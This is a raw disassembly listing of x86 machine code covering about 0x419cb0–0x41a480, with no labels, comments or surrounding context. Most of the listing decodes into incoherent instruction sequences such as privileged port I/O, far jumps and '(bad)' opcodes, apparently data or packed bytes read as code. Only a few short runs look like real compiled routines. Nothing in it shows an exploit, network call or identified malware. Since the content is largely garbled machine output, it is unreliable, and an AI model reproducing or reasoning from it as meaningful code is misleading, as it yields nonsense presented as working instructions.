  419cb0:	xchg   edi,eax
  419cb1:	adc    DWORD PTR [ecx],ebx
  419cb3:	rcr    DWORD PTR [ebp+0x749191c8],cl
  419cb9:	xor    ch,BYTE PTR ds:0x7cd767ac
  419cbf:	xchg   DWORD PTR [edx+ebp*1+0x70],ebx
  419cc3:	in     eax,0x3d
  419cc5:	cmp    DWORD PTR [edi+0x25],eax
  419cc8:	jno    0x419d28
  419cca:	outs   dx,DWORD PTR ds:[esi]
  419ccb:	sti    
  419ccc:	push   ebp
  419ccd:	stos   BYTE PTR es:[edi],al
  419cce:	adc    al,0x4b
  419cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cd1:	ins    DWORD PTR es:[edi],dx
  419cd2:	mov    eax,0x397208ad
  419cd7:	adc    eax,0xc086197d
  419cdc:	loope  0x419c9b
  419cde:	icebp  
  419cdf:	mov    ebp,0xeb7651d3
  419ce4:	fst    st(2)
  419ce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ce7:	leave  
  419ce8:	dec    ebp
  419ce9:	bound  esp,QWORD PTR ds:[eax+0x42]
  419ced:	inc    edi
  419cee:	in     eax,dx
  419cef:	pop    edx
  419cf0:	or     ch,BYTE PTR [ebx+edx*1-0x1]
  419cf4:	stos   DWORD PTR es:[edi],eax
  419cf5:	mov    ds,WORD PTR [ecx-0x7a]
  419cf8:	lods   eax,DWORD PTR ds:[esi]
  419cf9:	adc    eax,0xba99a69d
  419cfe:	cdq    
  419cff:	lock gs icebp 
  419d02:	cld    
  419d03:	push   esi
  419d04:	pop    eax
  419d05:	cmp    al,0xd4
  419d07:	sbb    al,0xde
  419d09:	jnp    0x419cbb
  419d0b:	pop    ss
  419d0c:	push   ebp
  419d0d:	pop    ds
  419d0e:	(bad)  
  419d0f:	popf   
  419d10:	out    0x83,eax
  419d12:	jecxz  0x419cc3
  419d14:	adc    ah,bl
  419d16:	push   0xffffffa8
  419d18:	push   cs
  419d19:	dec    edx
  419d1a:	cs test eax,0xa00e2b0b
  419d20:	mov    eax,0x25a4c82d
  419d25:	jae    0x419d95
  419d27:	mov    cl,0xcb
  419d29:	aaa    
  419d2a:	or     BYTE PTR [ebp-0x447c6697],ah
  419d30:	in     al,dx
  419d31:	push   0xe3a590da
  419d36:	push   0xffffffce
  419d38:	pop    eax
  419d39:	retf   0xf9ec
  419d3c:	call   0xcaf7:0xcb4b9200
  419d43:	and    eax,0xc93477b3
  419d48:	(bad)  
  419d49:	dec    esi
  419d4a:	jg     0x419db0
  419d4c:	push   ecx
  419d4d:	push   ebx
  419d4e:	cmp    al,BYTE PTR [edi+0x11aad2af]
  419d54:	adc    DWORD PTR [ebx],edi
  419d56:	inc    ebp
  419d57:	push   ss
  419d58:	mov    bl,0xf
  419d5a:	dec    edi
  419d5b:	scas   al,BYTE PTR es:[edi]
  419d5c:	ins    DWORD PTR es:[edi],dx
  419d5d:	adc    cl,BYTE PTR [eax+0x62]
  419d60:	and    ebp,DWORD PTR [edx+0x5a]
  419d63:	jmp    0x419dd6
  419d65:	xor    eax,0x6b088fb7
  419d6a:	ss ins BYTE PTR es:[edi],dx
  419d6c:	clc    
  419d6d:	sub    BYTE PTR [ecx-0x25],bh
  419d70:	push   ecx
  419d71:	jne    0x419d48
  419d73:	mov    edi,0x98650f0c
  419d78:	std    
  419d79:	jg     0x419d3f
  419d7b:	inc    esi
  419d7c:	mov    WORD PTR [edi],ss
  419d7e:	adc    bl,bl
  419d80:	mov    dh,0x7a
  419d82:	rol    DWORD PTR [esi],0xfa
  419d85:	dec    ecx
  419d86:	inc    edi
  419d87:	jl     0x419d76
  419d89:	das    
  419d8a:	mov    cl,0xcd
  419d8c:	test   eax,ecx
  419d8e:	iret   
  419d8f:	mov    ebx,DWORD PTR [edx+ebp*1]
  419d92:	adc    esp,DWORD PTR [ecx]
  419d94:	xchg   ecx,eax
  419d95:	xchg   esp,eax
  419d96:	sbb    eax,0xef039aaf
  419d9b:	lahf   
  419d9c:	or     ah,BYTE PTR [edi-0x38]
  419d9f:	pop    edi
  419da0:	mov    ss,ebx
  419da2:	xchg   esi,eax
  419da3:	or     esp,edx
  419da5:	inc    ebp
  419da6:	xlat   BYTE PTR ds:[ebx]
  419da7:	dec    esp
  419da8:	mov    ch,0xd7
  419daa:	adc    edi,DWORD PTR ds:[esi+0x375f2efe]
  419db1:	adc    al,0x90
  419db3:	lahf   
  419db4:	std    
  419db5:	jp     0x419d3f
  419db7:	inc    esp
  419db8:	xchg   BYTE PTR [esi],ch
  419dba:	add    BYTE PTR [ebx+0x3],dh
  419dbd:	pop    es
  419dbe:	push   ebx
  419dbf:	jmp    0xa7ecfe19
  419dc4:	lahf   
  419dc5:	aaa    
  419dc6:	adc    ebx,ebx
  419dc8:	and    DWORD PTR [ebx-0x74a477a2],0xffffffa6
  419dcf:	cdq    
  419dd0:	pop    esi
  419dd1:	shl    BYTE PTR [ebx+0x750d45b2],1
  419dd7:	fwait
  419dd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd9:	jb     0x419de7
  419ddb:	repz adc eax,DWORD PTR [esi+0x281b886a]
  419de2:	cmp    al,0xe9
  419de4:	int    0x65
  419de6:	jae    0x419e14
  419de8:	fwait
  419de9:	aas    
  419dea:	aam    0xa1
  419dec:	xor    dl,BYTE PTR [edi]
  419dee:	gs ins DWORD PTR es:[edi],dx
  419df0:	test   BYTE PTR [ebp+0x4d],al
  419df3:	sub    eax,0xfa431e11
  419df8:	js     0x419e34
  419dfa:	jl     0x419dfd
  419dfc:	dec    edi
  419dfd:	xchg   edx,eax
  419dfe:	stos   DWORD PTR es:[edi],eax
  419dff:	fyl2xp1 
  419e01:	(bad)  [esi]
  419e03:	add    BYTE PTR [esi+eiz*2+0x2424548b],dh
  419e0a:	xor    cx,dx
  419e0d:	mov    dx,WORD PTR [esp+0x2c]
  419e12:	imul   cx,dx
  419e16:	mov    dx,WORD PTR [esp+0x38]
  419e1b:	and    cx,dx
  419e1e:	mov    edx,0x694c
  419e23:	and    cx,dx
  419e26:	mov    dx,WORD PTR [esp+0x3c]
  419e2b:	cmp    dx,cx
  419e2e:	ja     0x41a320
  419e34:	mov    ecx,DWORD PTR [esp+0x18]
  419e38:	mov    edx,DWORD PTR [esp+0x1c]
  419e3c:	jmp    0x41a099
  419e41:	add    edi,DWORD PTR [edx-0x6d83ed16]
  419e47:	cmp    al,0xbc
  419e49:	loopne 0x419e57
  419e4b:	inc    edx
  419e4c:	fisttp QWORD PTR [edi-0x27]
  419e4f:	jecxz  0x419de1
  419e51:	adc    edx,DWORD PTR [edi]
  419e53:	sar    BYTE PTR [esi-0x41413dcb],0xcf
  419e5a:	or     cl,BYTE PTR [ebp-0x3c]
  419e5d:	dec    edx
  419e5e:	mov    edi,0x131c2231
  419e63:	cli    
  419e64:	dec    ecx
  419e65:	dec    edx
  419e66:	adc    al,0xa4
  419e68:	cmp    dl,dh
  419e6a:	js     0x419e30
  419e6c:	mov    ebx,ss
  419e6e:	xchg   ebx,eax
  419e6f:	jp     0x419e9b
  419e71:	retf   
  419e72:	fmulp  st(1),st
  419e74:	mov    ds:0x121c737f,al
  419e79:	xor    BYTE PTR [ebx+0x53],al
  419e7c:	icebp  
  419e7d:	imul   esi,esi,0xffffffcc
  419e80:	xor    DWORD PTR [esi+0x5f],ebp
  419e83:	or     eax,ebp
  419e85:	jle    0x419f05
  419e87:	push   ds
  419e88:	jmp    DWORD PTR [esi+ebp*8]
  419e8b:	jbe    0x419e93
  419e8d:	ficom  DWORD PTR [edx*8-0x72736f03]
  419e94:	retf   0x4117
  419e97:	std    
  419e98:	(bad)  
  419e99:	fnstsw WORD PTR [edx+0x20]
  419e9c:	pusha  
  419e9d:	inc    edx
  419e9e:	test   eax,0x1facb2db
  419ea3:	add    DWORD PTR [eax+0x7f61114a],ecx
  419ea9:	test   al,0x7d
  419eab:	mov    ch,0x6d
  419ead:	nop
  419eae:	shr    BYTE PTR [ebp+0x2d222766],cl
  419eb4:	fnsave [ebx-0x1e]
  419eb7:	jge    0x419e70
  419eb9:	xor    edx,DWORD PTR [ecx+eiz*4]
  419ebc:	xor    al,0x4b
  419ebe:	out    dx,eax
  419ebf:	lock add bl,BYTE PTR [esi-0x71]
  419ec3:	cmp    BYTE PTR [esi+0x35],0x25
  419ec7:	xlat   BYTE PTR ds:[ebx]
  419ec8:	sbb    dl,BYTE PTR [esi*1-0x6c5ef292]
  419ecf:	xchg   bh,dh
  419ed1:	add    DWORD PTR [eax],esp
  419ed3:	jae    0x419f3b
  419ed5:	lods   al,BYTE PTR ds:[esi]
  419ed6:	stc    
  419ed7:	jmp    0x1558:0x24755407
  419ede:	loop   0x419f05
  419ee0:	sbb    al,0x6c
  419ee2:	add    DWORD PTR [edi],0xc25cf62b
  419ee8:	repz lahf 
  419eea:	sub    al,0x15
  419eec:	leave  
  419eed:	iret   
  419eee:	jecxz  0x419f5d
  419ef0:	into   
  419ef1:	and    dl,BYTE PTR es:[esi+eiz*8-0xa487b0e]
  419ef9:	pop    edx
  419efa:	ror    BYTE PTR [edi],cl
  419efc:	pop    edx
  419efd:	mov    dl,0x99
  419eff:	out    0xd0,al
  419f01:	repz out dx,al
  419f03:	popf   
  419f04:	mov    edi,0x8eb512cb
  419f09:	idiv   DWORD PTR [edi-0x18]
  419f0c:	inc    esp
  419f0d:	dec    esp
  419f0e:	pop    esi
  419f0f:	push   ss
  419f10:	inc    ebx
  419f11:	mov    DWORD PTR [ebx],eax
  419f13:	dec    edx
  419f14:	mov    ebp,0x3915f003
  419f19:	cmp    ah,BYTE PTR [edx+0x52d66086]
  419f1f:	dec    ebp
  419f20:	addr16 pop ecx
  419f22:	in     eax,dx
  419f23:	out    0x17,eax
  419f25:	dec    ebp
  419f26:	nop
  419f27:	aad    0x81
  419f29:	push   edx
  419f2a:	jb     0x419f4c
  419f2c:	pop    esi
  419f2d:	rcl    BYTE PTR [edx],cl
  419f2f:	mov    esi,0xb6aec01e
  419f34:	push   es
  419f35:	lock xchg BYTE PTR [ebx+ebx*2-0x7591694c],bh
  419f3d:	int3   
  419f3e:	es stos BYTE PTR es:[edi],al
  419f40:	int3   
  419f41:	retf   0xd8e1
  419f44:	inc    esp
  419f45:	mov    ch,0x88
  419f47:	popa   
  419f48:	and    al,0x36
  419f4a:	jb     0x419f78
  419f4c:	pop    esp
  419f4d:	jle    0x419f78
  419f4f:	mov    bh,0xa0
  419f51:	rcr    BYTE PTR [edx+0x1b],1
  419f54:	call   0x2162:0x2b5891b2
  419f5b:	std    
  419f5c:	mov    esp,0x7613dd6e
  419f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f62:	jb     0x419f5f
  419f64:	or     cl,BYTE PTR [ecx-0x6d9a734f]
  419f6a:	and    eax,0x82df76e4
  419f6f:	or     al,ah
  419f71:	scas   al,BYTE PTR es:[edi]
  419f72:	ret    0x9643
  419f75:	mov    ah,0xcb
  419f77:	sbb    ebx,edx
  419f79:	jmp    0x419f5c
  419f7b:	sti    
  419f7c:	adc    esp,DWORD PTR [ebp+0x31]
  419f7f:	sub    eax,DWORD PTR [ebx+esi*8+0x1d00ed78]
  419f86:	cmp    eax,0xcc355370
  419f8b:	dec    ebp
  419f8c:	es mov ebp,ebp
  419f8f:	xor    ecx,0x5b
  419f92:	les    ebx,FWORD PTR [esi]
  419f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f95:	shr    DWORD PTR [edi*2-0x2603c1a1],0x68
  419f9d:	popa   
  419f9e:	mov    eax,0x6f79c00b
  419fa3:	js     0x419f8f
  419fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fa6:	in     al,dx
  419fa7:	pop    ecx
  419fa8:	retf   0x19e2
  419fab:	xchg   ebx,eax
  419fac:	sar    BYTE PTR [edi+0x79555493],cl
  419fb2:	adc    eax,DWORD PTR [ebp-0x62]
  419fb5:	and    BYTE PTR [ebx-0x68],ah
  419fb8:	push   0x477ca920
  419fbd:	and    ecx,DWORD PTR ds:0xe7fa7e79
  419fc3:	or     DWORD PTR [ecx],edi
  419fc5:	mov    ds:0x1b371211,eax
  419fca:	dec    ebp
  419fcb:	aad    0x1
  419fcd:	(bad)  
  419fce:	leave  
  419fcf:	rol    BYTE PTR [eax],0x82
  419fd2:	pop    ss
  419fd3:	popa   
  419fd4:	and    eax,0x59ebc09e
  419fd9:	dec    esi
  419fda:	jne    0x41a023
  419fdc:	cmc    
  419fdd:	mov    edx,0xbc208db
  419fe2:	fwait
  419fe3:	adc    BYTE PTR [edi+eax*4+0x3a],dl
  419fe7:	sub    edi,DWORD PTR [edi+0x3b]
  419fea:	dec    ebx
  419feb:	cmp    ebx,DWORD PTR [esi+0x32432876]
  419ff1:	mov    dl,0xea
  419ff3:	ja     0x41a05b
  419ff5:	imul   esi,esp,0x2e87673a
  419ffb:	dec    ebx
  419ffc:	adc    DWORD PTR [eax],edi
  419ffe:	shr    DWORD PTR [ecx+0x46213c3f],cl
  41a004:	cld    
  41a005:	mov    ch,0xb2
  41a007:	sub    esp,edi
  41a009:	sti    
  41a00a:	mov    edi,0x2d0012b1
  41a00f:	sub    DWORD PTR ds:[edx+0x3d4c996e],ecx
  41a016:	fnstsw WORD PTR [esi+0x1e9743]
  41a01c:	sub    ah,dh
  41a01e:	dec    esi
  41a01f:	ja     0x41a078
  41a021:	cmp    ebp,DWORD PTR [eax-0x34]
  41a024:	adc    al,0x35
  41a026:	pop    ecx
  41a027:	cmp    BYTE PTR [edi],0xae
  41a02a:	or     al,0xea
  41a02c:	pop    edx
  41a02d:	jns    0x419fd7
  41a02f:	aas    
  41a030:	pop    edx
  41a031:	mov    dl,BYTE PTR [ebx]
  41a033:	fdiv   DWORD PTR [edx-0x1ad4e588]
  41a039:	jge    0x41a06a
  41a03b:	xchg   esi,eax
  41a03c:	test   eax,0x4ed8e3c4
  41a041:	fwait
  41a042:	adc    esi,DWORD PTR [esi-0x8]
  41a045:	div    bh
  41a047:	pop    esi
  41a048:	test   DWORD PTR [ecx-0x349b6099],ecx
  41a04e:	(bad)  [ebx+0x6fdb4a4a]
  41a054:	jl     0x41a095
  41a056:	cmc    
  41a057:	mov    dh,0x7d
  41a059:	mov    dl,BYTE PTR [edi+0x495970cd]
  41a05f:	xchg   dh,bh
  41a061:	dec    eax
  41a062:	cld    
  41a063:	xor    DWORD PTR [ecx+0x4f8397ce],edi
  41a069:	xchg   ecx,eax
  41a06a:	push   ecx
  41a06b:	jmp    0xe4e3:0xf01835fc
  41a072:	imul   esp,DWORD PTR [esi],0xffffffef
  41a075:	adc    al,0xde
  41a077:	imul   ecx,DWORD PTR [eax+0x2d],0xab186121
  41a07e:	in     eax,0x3
  41a080:	dec    edx
  41a081:	adc    eax,DWORD PTR [ecx+0x7b]
  41a084:	mov    ecx,0x1bcf61b5
  41a089:	stos   BYTE PTR es:[edi],al
  41a08a:	pop    ss
  41a08b:	push   esi
  41a08c:	mov    cl,BYTE PTR [edi+0x263fc255]
  41a092:	xor    ch,al
  41a094:	add    al,0xee
  41a096:	and    ebx,DWORD PTR ds:0xd1ac0f64
  41a09c:	add    dh,BYTE PTR [ebx]
  41a09e:	enter  0x448b,0x24
  41a0a2:	sbb    cl,al
  41a0a4:	jmp    0x331c:0x24548b02
  41a0ab:	shr    cl,cl
  41a0ad:	pop    eax
  41a0ae:	add    al,BYTE PTR [eax]
  41a0b0:	add    BYTE PTR [esi-0x51],ah
  41a0b3:	xchg   ebx,eax
  41a0b4:	mov    dh,0x9c
  41a0b6:	mov    edx,0x94c4af6c
  41a0bb:	pop    esp
  41a0bc:	rol    DWORD PTR [ebx],1
  41a0be:	outs   dx,DWORD PTR ds:[esi]
  41a0bf:	sahf   
  41a0c0:	nop
  41a0c1:	mov    ebx,DWORD PTR [ebx]
  41a0c3:	sar    BYTE PTR [esi-0x41413dcb],0xff
  41a0ca:	mov    ah,0x4c
  41a0cc:	ret    0xdb14
  41a0cf:	mov    ?,WORD PTR [edi]
  41a0d1:	int3   
  41a0d2:	lock sbb eax,0x93e71133
  41a0d8:	mov    ds:0x9850a0b7,eax
  41a0dd:	in     eax,0x4
  41a0df:	pop    esp
  41a0e0:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41a0e2:	(bad)  
  41a0e3:	cdq    
  41a0e4:	out    dx,eax
  41a0e5:	xchg   ebx,eax
  41a0e6:	mov    ds:0x3caacd5a,al
  41a0eb:	mov    dl,0xd0
  41a0ed:	retf   
  41a0ee:	mov    al,0xb1
  41a0f0:	in     al,0x89
  41a0f2:	in     eax,dx
  41a0f3:	jae    0x41a0ee
  41a0f5:	(bad)  
  41a0f6:	bnd ja 0x41a15f
  41a0f9:	adc    edi,DWORD PTR [ecx+ecx*1]
  41a0fc:	enter  0x5296,0xed
  41a100:	fcomi  st,st(4)
  41a102:	push   ecx
  41a103:	test   al,0x44
  41a105:	xchg   BYTE PTR ds:0x93eddffb,bh
  41a10b:	retf   0xd185
  41a10e:	or     DWORD PTR [ecx],ecx
  41a110:	inc    esi
  41a111:	mov    ch,0x9f
  41a113:	mov    al,0x16
  41a115:	pop    edi
  41a116:	rcl    BYTE PTR [edi],cl
  41a118:	jl     0x41a189
  41a11a:	addr16 call 0x93d:0xeaa4054e
  41a122:	leave  
  41a123:	pop    ebx
  41a124:	xchg   edx,eax
  41a125:	sub    eax,0x8c0e4b30
  41a12a:	sub    al,0x20
  41a12c:	or     eax,0xce8e7724
  41a131:	iret   
  41a132:	adc    esp,edx
  41a134:	adc    BYTE PTR [edi+ebp*8+0x634931a1],bl
  41a13b:	inc    esp
  41a13c:	int    0x54
  41a13e:	sub    eax,ebx
  41a140:	popf   
  41a141:	xor    dl,BYTE PTR [edx*2+0x4d7a817a]
  41a148:	cmp    eax,0xd90b79c5
  41a14d:	or     al,BYTE PTR [bp+di+0x4361]
  41a152:	ss mov ah,0xb2
  41a155:	loope  0x41a0f3
  41a157:	xchg   esp,eax
  41a158:	inc    esi
  41a159:	mov    al,ds:0xfb0eac95
  41a15e:	fisubr DWORD PTR [ebx+0xdc3766a]
  41a164:	(bad)  
  41a166:	jae    0x41a119
  41a168:	sub    bh,BYTE PTR [eax-0x3670a566]
  41a16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a16f:	push   cs
  41a170:	and    DWORD PTR [edi+ebp*8+0x238f4359],ebp
  41a177:	fs cs inc ecx
  41a17a:	xor    al,0x90
  41a17c:	lds    edi,FWORD PTR [eax-0x54]
  41a17f:	cwde   
  41a180:	fdivr  st,st(4)
  41a182:	push   ecx
  41a183:	inc    edx
  41a184:	push   ecx
  41a185:	icebp  
  41a186:	enter  0x69a,0xd1
  41a18a:	pop    ebp
  41a18b:	int    0xdd
  41a18d:	adc    dl,BYTE PTR [edi]
  41a18f:	pop    ss
  41a190:	shl    DWORD PTR [esi+0x16dbff33],cl
  41a196:	jmp    0x636a:0x854e6351
  41a19d:	mov    ds:0xaf57c0eb,eax
  41a1a2:	inc    ebx
  41a1a3:	dec    ebx
  41a1a4:	nop
  41a1a5:	xchg   DWORD PTR [edx+ebp*4-0x2892d997],esp
  41a1ac:	jle    0x41a210
  41a1ae:	sbb    BYTE PTR [ebx+esi*1],0xcb
  41a1b2:	in     eax,0x97
  41a1b4:	in     eax,dx
  41a1b5:	cmp    DWORD PTR [esi+0x72],esi
  41a1b8:	add    al,BYTE PTR [esi]
  41a1ba:	pop    es
  41a1bb:	lea    eax,[edi]
  41a1bd:	jnp    0x41a180
  41a1bf:	mov    esi,0xfb080368
  41a1c4:	dec    edi
  41a1c5:	pop    ebx
  41a1c6:	scas   al,BYTE PTR es:[edi]
  41a1c7:	sub    esi,edi
  41a1c9:	add    BYTE PTR ds:0x1a86b904,al
  41a1cf:	(bad)  
  41a1d0:	dec    edi
  41a1d1:	test   eax,0x16f6a1d2
  41a1d6:	cld    
  41a1d7:	(bad)  
  41a1d8:	dec    esi
  41a1d9:	jle    0x41a24c
  41a1db:	push   ebx
  41a1dc:	loopne 0x41a255
  41a1de:	fbld   TBYTE PTR [ebp+0x361a648d]
  41a1e4:	xor    dh,dl
  41a1e6:	dec    edx
  41a1e7:	das    
  41a1e8:	imul   BYTE PTR [edi-0x2680aa92]
  41a1ee:	in     eax,0xe3
  41a1f0:	mov    al,0xd8
  41a1f2:	or     eax,0x3a93d254
  41a1f7:	call   0xa3429076
  41a1fc:	sahf   
  41a1fd:	iret   
  41a1fe:	sub    eax,0x9598ed8a
  41a203:	xchg   esi,eax
  41a204:	retf   0xb4b9
  41a207:	xchg   edi,eax
  41a208:	push   cs
  41a209:	popf   
  41a20a:	fs cmc 
  41a20c:	test   DWORD PTR [eax+0x2309e933],eax
  41a212:	push   ss
  41a213:	push   esp
  41a214:	or     DWORD PTR [edx],ebp
  41a216:	jnp    0x41a230
  41a218:	nop
  41a219:	in     eax,dx
  41a21a:	mov    ebx,0x61a2dfb8
  41a21f:	add    al,0x14
  41a221:	lea    ebx,[ecx]
  41a223:	adc    eax,0x3b23c0a1
  41a228:	mov    cl,0xb5
  41a22a:	loope  0x41a276
  41a22c:	push   esi
  41a22d:	lods   al,BYTE PTR ds:[esi]
  41a22e:	div    bh
  41a230:	and    ecx,ecx
  41a232:	xchg   esp,eax
  41a233:	inc    esp
  41a234:	pop    ebp
  41a235:	pop    ds
  41a236:	add    al,0x64
  41a238:	mov    ebp,0xd8303602
  41a23d:	xchg   ecx,eax
  41a23e:	jmp    0x215b:0x64c474a2
  41a245:	pop    esi
  41a246:	xchg   ebx,eax
  41a247:	mov    cl,0x0
  41a249:	jo     0x41a2b4
  41a24b:	je     0x41a1f9
  41a24d:	or     ebp,DWORD PTR [esi-0x6]
  41a250:	sub    bl,BYTE PTR [ecx-0x3b]
  41a253:	mov    edx,0xebcaea3
  41a258:	cmp    edi,ecx
  41a25a:	(bad)  
  41a25b:	jmp    FWORD PTR ds:0xd40ac038
  41a261:	mov    BYTE PTR [ebx],bl
  41a263:	pop    ecx
  41a264:	and    edi,edx
  41a266:	push   ecx
  41a267:	adc    BYTE PTR [edi],0x76
  41a26a:	jne    0x41a2d3
  41a26c:	idiv   DWORD PTR [eax-0x1d]
  41a26f:	mov    eax,ds:0xcae773fd
  41a274:	mov    ecx,0xe11ec576
  41a279:	cmp    al,0x7a
  41a27c:	sub    BYTE PTR [ecx+0x4b],0xef
  41a280:	pop    esi
  41a281:	pusha  
  41a282:	loope  0x41a213
  41a284:	push   0xffffff93
  41a286:	push   esp
  41a287:	jl     0x41a2cb
  41a289:	pop    ecx
  41a28a:	mov    esp,0xd78fc0b2
  41a28f:	into   
  41a290:	xchg   edi,eax
  41a291:	push   esi
  41a292:	loopne 0x41a263
  41a294:	mov    DWORD PTR [edi-0x30fba7bd],eax
  41a29a:	jmp    FWORD PTR [esi]
  41a29c:	adc    dl,al
  41a29e:	push   0xb0085378
  41a2a3:	xor    cl,ah
  41a2a5:	pop    ss
  41a2a6:	cmp    al,ah
  41a2a8:	popa   
  41a2a9:	mov    eax,ds:0xced52445
  41a2ae:	or     esi,esp
  41a2b0:	inc    eax
  41a2b1:	leave  
  41a2b2:	stos   DWORD PTR es:[edi],eax
  41a2b3:	jo     0x41a329
  41a2b5:	xchg   ebx,eax
  41a2b6:	fidivr WORD PTR [esi-0x7e]
  41a2b9:	sub    al,0x73
  41a2bb:	pop    edi
  41a2bc:	fnsave [ecx-0x214e877f]
  41a2c2:	or     DWORD PTR [ebx+eiz*8],ecx
  41a2c5:	arpl   WORD PTR [ebp+esi*8+0x45],si
  41a2c9:	xchg   ebx,eax
  41a2ca:	fiadd  WORD PTR [edx+edi*4]
  41a2cd:	mov    al,0xf4
  41a2cf:	js     0x41a26f
  41a2d1:	cld    
  41a2d2:	cmp    ebx,esi
  41a2d4:	jp     0x41a303
  41a2d6:	mov    cl,0x62
  41a2d8:	or     ah,0xbc
  41a2db:	or     DWORD PTR [edx+0x135ad8b1],ebx
  41a2e1:	mov    ds:0x35076fa7,eax
  41a2e6:	cli    
  41a2e7:	jle    0x41a319
  41a2e9:	sbb    DWORD PTR [esi],edx
  41a2eb:	loop   0x41a2f0
  41a2ed:	adc    ah,BYTE PTR [ebp+0x77dcd311]
  41a2f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2f4:	and    al,0x46
  41a2f6:	pushf  
  41a2f7:	fadd   QWORD PTR [edi-0x25c752d6]
  41a2fd:	test   al,0x22
  41a2ff:	add    eax,0xc1c1eed5
  41a304:	push   0x60fc68bd
  41a309:	or     edx,ecx
  41a30b:	push   edx
  41a30c:	push   esi
  41a30d:	shl    eax,0x1e
  41a310:	push   edi
  41a311:	lea    eax,[esp+0x7c]
  41a315:	push   eax
  41a316:	lea    eax,[esp+0x28]
  41a31a:	push   eax
  41a31b:	call   0x411472
  41a320:	push   DWORD PTR [esp+0x74]
  41a324:	push   DWORD PTR [esp+0x74]
  41a328:	push   DWORD PTR [esp+0x24]
  41a32c:	push   DWORD PTR [esp+0x24]
  41a330:	call   0x412349
  41a335:	mov    edx,DWORD PTR [esp+0x18]
  41a339:	mov    eax,DWORD PTR [esp+0x1c]
  41a33d:	mov    ecx,DWORD PTR [esp+0x18]
  41a341:	mov    edi,DWORD PTR [esp+0x1c]
  41a345:	shrd   edx,eax,0x2
  41a349:	shr    eax,0x2
  41a34c:	shl    ecx,0x1e
  41a34f:	xor    ecx,ecx
  41a351:	mov    eax,0x32de6d5d
  41a356:	xor    edx,eax
  41a358:	or     ecx,edx
  41a35a:	mov    edx,DWORD PTR [esp+0x5c]
  41a35e:	mov    DWORD PTR [edx],ecx
  41a360:	mov    ecx,DWORD PTR [esp+0x18]
  41a364:	jmp    0x41a5c1
  41a369:	repz sub cl,0x71
  41a36d:	mov    edx,0x20807cbb
  41a372:	shl    al,cl
  41a374:	iret   
  41a375:	daa    
  41a376:	pop    edx
  41a377:	jbe    0x41a30b
  41a379:	add    al,0x1f
  41a37b:	sar    BYTE PTR [esi-0x41413dcb],0xaf
  41a382:	or     al,0xa7
  41a384:	fimul  DWORD PTR ds:0xd21fc663
  41a38a:	dec    ebx
  41a38b:	jnp    0x41a3e8
  41a38d:	mov    edi,0x36912008
  41a392:	loopne 0x41a3d8
  41a394:	mov    dl,0x59
  41a396:	aad    0xc4
  41a398:	and    dh,BYTE PTR ds:0xb26e953c
  41a39e:	mov    ecx,0x4d63bce4
  41a3a3:	mov    ch,cl
  41a3a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3a6:	add    al,0x84
  41a3a8:	mov    ebp,0x6f007c7
  41a3ad:	inc    edx
  41a3ae:	push   ecx
  41a3af:	cmp    ch,BYTE PTR [edi+0x71]
  41a3b2:	neg    BYTE PTR [eax+0x7daa2d55]
  41a3b8:	cmp    ebp,DWORD PTR [ebx+0x1755305a]
  41a3be:	sbb    eax,0x8ce55085
  41a3c3:	out    dx,eax
  41a3c4:	sbb    eax,0x7d49de54
  41a3c9:	pop    edi
  41a3ca:	push   0xea4a0ff3
  41a3cf:	cmc    
  41a3d0:	loop   0x41a404
  41a3d2:	pop    es
  41a3d3:	call   0x3889fd12
  41a3d8:	arpl   sp,sp
  41a3da:	adc    al,0x79
  41a3dc:	ret    
  41a3dd:	ret    
  41a3de:	out    0x59,eax
  41a3e0:	add    al,0xbe
  41a3e2:	shl    cl,1
  41a3e4:	pop    edi
  41a3e5:	lahf   
  41a3e6:	fistp  DWORD PTR [ebx+0x20194f00]
  41a3ec:	cli    
  41a3ed:	mov    esi,0x3f3b2ee6
  41a3f2:	clc    
  41a3f3:	jmp    0x41a37b
  41a3f5:	call   0x4fa7:0xd68042cd
  41a3fc:	ret    0xce8d
  41a3ff:	ficom  WORD PTR [esi-0x72]
  41a402:	cmp    edx,DWORD PTR [edx-0x4e]
  41a405:	mov    esi,0x9b44fe72
  41a40a:	sbb    BYTE PTR [edi+0x7650ac42],bl
  41a410:	daa    
  41a411:	lock pop eax
  41a413:	xchg   edi,eax
  41a414:	mov    ecx,ss
  41a416:	jg     0x41a400
  41a418:	pop    esi
  41a419:	xor    DWORD PTR [ebx-0x5b],edx
  41a41c:	mov    al,cl
  41a41e:	test   DWORD PTR [edx],esp
  41a420:	adc    edx,edi
  41a422:	icebp  
  41a423:	pop    ecx
  41a424:	(bad)  
  41a425:	push   eax
  41a426:	test   DWORD PTR [edi+edx*8+0x9],ebx
  41a42a:	mov    ch,0x89
  41a42c:	jmp    0xdb8d:0xe240cb95
  41a433:	xor    BYTE PTR [edx],al
  41a435:	dec    edx
  41a436:	cld    
  41a437:	or     eax,DWORD PTR [ebx-0x243a15a2]
  41a43d:	xchg   ecx,eax
  41a43e:	cmc    
  41a43f:	xor    DWORD PTR [ebp-0x4e331253],0xc534c29
  41a449:	cmp    al,BYTE PTR [eax+0x2c]
  41a44c:	out    dx,eax
  41a44d:	mov    cl,0x2b
  41a44f:	dec    ebp
  41a450:	loop   0x41a48d
  41a452:	std    
  41a453:	mov    al,0xef
  41a455:	not    DWORD PTR [edi-0x28]
  41a458:	push   0xcab7178b
  41a45d:	or     eax,esp
  41a45f:	or     bl,bh
  41a461:	mov    al,ds:0xca1c8ea9
  41a466:	rol    DWORD PTR [edx+0x7c],1
  41a469:	xchg   edx,eax
  41a46a:	dec    eax
  41a46b:	push   esi
  41a46c:	sub    BYTE PTR [ecx+0x23433f02],bh
  41a472:	push   eax
  41a473:	jecxz  0x41a45c
  41a475:	ins    DWORD PTR es:[edi],dx
  41a476:	sbb    esp,0x45b08b22
  41a47c:	add    edx,DWORD PTR [ecx]
  41a47e:	jl     0x41a4a9
  41a480:	call   0x18bd:0x34d65793
